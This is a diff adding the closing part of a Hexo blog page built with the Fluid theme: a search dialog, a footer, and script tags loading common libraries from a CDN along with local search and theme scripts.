+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
